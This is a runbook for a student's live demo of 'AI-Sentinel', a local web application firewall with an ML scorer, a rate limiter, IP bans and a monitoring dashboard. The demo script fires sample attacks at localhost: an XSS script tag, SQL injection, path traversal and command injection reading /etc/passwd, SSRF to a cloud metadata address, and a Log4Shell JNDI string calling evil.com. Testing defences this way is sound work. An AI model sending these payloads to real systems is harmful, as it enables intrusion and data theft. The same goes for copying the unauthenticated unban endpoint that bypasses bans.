# AI-Sentinel: 3-Minute Live Viva Demo Runbook

> **Guaranteed Safe & Repeatable Live Demonstration Guide**  
> *Targeted for Capstone Evaluation, Technical Viva, and Professor Demonstrations.*

---

## 1. Pre-Flight Checklist (Run 10 Minutes Before Demo)

| Check | Requirement | How to Verify | Status |
| :--- | :--- | :--- | :---: |
| **Offline Ready** | 0 internet required (all models & DB local) | Disconnect Wi-Fi; run `python demo.py` | Verified |
| **Port 5000 Free** | No conflicting servers running | `netstat -ano \| findstr :5000` | Verified |
| **Model Artifact** | `data/model.joblib` present (~878 KB) | `Test-Path data\model.joblib` -> `True` | Verified |
| **Clean Database** | DB initialized with 0 prior stale events | `python -c "from sentinel.db import stats; print(stats())"` | Verified |
| **Unit Tests Passing** | All 30 test assertions green | `python -m unittest tests.test_basic` -> `OK` | Verified |

---

## 2. Fast Reset Between Demo Runs (< 5 Seconds)

If you need to clear all attacks, events, and bans to demonstrate fresh to another evaluator:

```powershell
# 1-Line Clean Reset:
Remove-Item data\sentinel.db -ErrorAction SilentlyContinue; python -c "from sentinel import db; db.init_db(); print('DB Reset Complete!')"
```

### How to Restore Previous Backup
A timestamped backup of the database was saved at:
`data/sentinel_backup_20261122_123357.db`

To restore it at any time:
```powershell
Copy-Item data\sentinel_backup_20261122_123357.db data\sentinel.db -Force
```

---

## 3. The 3-Minute Live Demo Sequence (Step-by-Step)

### Setup (Terminal Preparation):
- **Terminal 1:** Run server:
  ```powershell
  python run.py
  ```
  *(Server runs at `http://127.0.0.1:5000`)*
- **Terminal 2:** Keep open in workspace for demo execution:
  `c:\offer letters\ai-sentinel-starter\ai-sentinel-starter`
- **Browser Tabs to Open:**
  1. Target Portal: [http://127.0.0.1:5000/](http://127.0.0.1:5000/)
  2. SOC Dashboard: [http://127.0.0.1:5000/sentinel/dashboard](http://127.0.0.1:5000/sentinel/dashboard)
  3. System Health: [http://127.0.0.1:5000/sentinel/health](http://127.0.0.1:5000/sentinel/health)

---

### ⏱️ Minute 1: The Corporate Surface & Baseline Performance

1. **Action:** Open [http://127.0.0.1:5000/](http://127.0.0.1:5000/) in browser. Click on module links (e.g. ERP Ledger, Cloud Nodes) and run a search for `cloud`.
2. **What to Say:**
   > *"Sir/Ma'am, ye hamara enterprise application surface hai — NexusCorp Cloud Management Suite. AI-Sentinel WAF iske aage sub-millisecond reverse-proxy/middleware bankar deployed hai. Abhi legitimate user browsing chal rahi hai, isliye sub-millisecond overhead ke sath har request 200 OK ke sath allow ho rahi hai."*
3. **Show in SOC Dashboard:**
   Switch to tab `http://127.0.0.1:5000/sentinel/dashboard`. Show green `ALLOW` tags in the live event stream.

---

### ⏱️ Minute 2: OWASP Top 10 Live Attack Interception & Tracing

1. **Action:** In the browser address bar, inject a Cross-Site Scripting (XSS) payload:
   ```text
   http://127.0.0.1:5000/search?q=<script>alert('xss_attack')</script>
   ```
2. **Expected Response:**
   Browser immediately displays:
   `403 Forbidden - blocked by AI-Sentinel (incident #XX)`
3. **Show Network Header:**
   Open Chrome DevTools (`F12` -> Network tab -> click `search`). Show `X-Request-ID` header (e.g. `7cf500e3`) and defense headers (`Content-Security-Policy`, `X-Frame-Options: DENY`).
4. **What to Say:**
   > *"Notice kijiye ki request backend application tak pahunchi hi nahi. Anti-evasion layer ne URL unquote kiya, regex engine ne OWASP XSS signatures match kiye (Score 10), aur instant 403 Forbidden intercept hua. Har blocked incident ko ek unique 8-character Correlation UUID milta hai."*
5. **Show in SOC Dashboard:**
   Switch to SOC Dashboard. Top row matches the exact **Request ID**, Category **XSS**, Action **BLOCK**, Rule Score **10**, and sub-millisecond latency.

---

### ⏱️ Minute 3: Automated Multi-Vector Pen-Test, Rate Limit, & 1-Click Unban

1. **Action:** In Terminal 2, trigger automated test suite:
   ```powershell
   python demo.py
   ```
2. **Watch Live Output:**
   - SQLi (`' OR 1=1 --`) -> `403 Forbidden`
   - Path Traversal (`../../etc/passwd`) -> `403 Forbidden`
   - Command Injection (`; cat /etc/passwd`) -> `403 Forbidden`
   - SSRF Cloud Metadata (`169.254.169.254`) -> `403 Forbidden`
   - Log4Shell JNDI (`${jndi:ldap://evil.com/x}`) -> `403 Forbidden`
   - Rapid Traffic (30 requests) -> Rate limited (`429 Too Many Requests`)
   - Brute-Force (7 invalid logins) -> **Automatic IP Ban for 60 seconds**.
3. **What to Say:**
   > *"Humne automated penetration testing suite chalaayi hai jo modern attack vectors test karti hai. Dekhiye 5 failed logins ke baad brute-force protection trigger hui aur IP 60 seconds ke liye statefully ban ho gaya. SQLite database me ban persist ho chuka hai jo server restart par bhi active rehta hai."*
4. **Demonstrate Active Ban & Unban:**
   - Try opening [http://127.0.0.1:5000/](http://127.0.0.1:5000/) in browser -> displays `403 Forbidden (IP temporarily banned)`.
   - Go to [http://127.0.0.1:5000/sentinel/dashboard](http://127.0.0.1:5000/sentinel/dashboard) (Dashboard always remains accessible to administrators).
   - Under **Active Banned IPs**, show `127.0.0.1` with remaining seconds.
   - Click the blue **🔓 Unban** button!
   - Refresh [http://127.0.0.1:5000/](http://127.0.0.1:5000/) -> Website opens normally again!

---

## 4. Verification of Request ID Correlation

Correlation was verified on live server:
- Attack Payload: `/search?q=<script>alert('viva_match')</script>`
- Response Body: `403 Forbidden - blocked by AI-Sentinel (incident #50)`
- Response Header: `X-Request-ID: 7cf500e3`
- SOC DB Incident #: `50`
- SOC DB Request ID: `7cf500e3`
- Status: **100% Correlation Match Verified**.

---

## 5. Exact Screenshots to Capture

Capture these 4 key screens for your presentation slides and viva report:

1. **Screen 1: Enterprise Target Surface**
   - **URL:** `http://127.0.0.1:5000/`
   - **Visuals:** Dark-theme NexusCorp Enterprise Portal, hero banner, enterprise modules catalog, system operational badges.
2. **Screen 2: 403 Security Interception Page & Headers**
   - **URL:** `http://127.0.0.1:5000/search?q=%3Cscript%3Ealert(1)%3C/script%3E`
   - **Visuals:** 403 Forbidden message with incident number, plus Chrome DevTools Network tab showing `X-Request-ID` and `Content-Security-Policy`.
3. **Screen 3: SOC Real-Time Monitoring Dashboard**
   - **URL:** `http://127.0.0.1:5000/sentinel/dashboard`
   - **Visuals:** Metric counter cards (Total Events, Blocks, Allows, Rate Limits), Attack Category breakdown, and correlated log table showing Request IDs, Rule Scores, ML Scores.
4. **Screen 4: IP Ban & 1-Click Unban UI**
   - **URL:** `http://127.0.0.1:5000/sentinel/dashboard`
   - **Visuals:** Active Banned IPs section highlighting `127.0.0.1`, ban reason (`brute force`), and the blue **🔓 Unban** button.

---

## 6. Three Things That Could Fail Live & Their Immediate Fallback

### 🔴 Failure 1: Port 5000 Already in Use (`WinError 10048 / Address already in use`)
- **Cause:** Previous python process or background task is still bound to port 5000.
- **Immediate Fallback (1 Command):**
  ```powershell
  Get-Process python | Stop-Process -Force; python run.py
  ```
  *(Alternative: Change port in `run.py` to `5001` and open `http://127.0.0.1:5001`).*

---

### 🔴 Failure 2: Localhost IP Still Banned from Previous Demo Run (Homepage gives 403)
- **Cause:** `demo.py` brute-force test bans `127.0.0.1` for 60 seconds. If you try to open the homepage immediately, it returns 403.
- **Immediate Fallback (2 Options):**
  - **Option A (GUI):** Open `http://127.0.0.1:5000/sentinel/dashboard` (dashboard bypasses IP bans) and click **🔓 Unban** next to `127.0.0.1`.
  - **Option B (CLI):** Run in Terminal:
    ```powershell
    python -c "import urllib.request; req = urllib.request.Request('http://127.0.0.1:5000/sentinel/api/unban/127.0.0.1', method='POST'); urllib.request.urlopen(req); print('Unbanned!')"
    ```

---

### 🔴 Failure 3: Model Joblib Missing / Corrupt File Error
- **Cause:** `data/model.joblib` accidentally deleted or wrong working directory.
- **Immediate Fallback:**
  `sentinel/ml.py` has automatic self-healing fallback code:
  `if not os.path.exists(config.MODEL_PATH): train()`.
  If needed, run the 2-second trainer:
  ```powershell
  python train.py
  ```
  *(Re-trains lightweight Isolation Forest in 2 seconds and saves fresh `data/model.joblib`).*
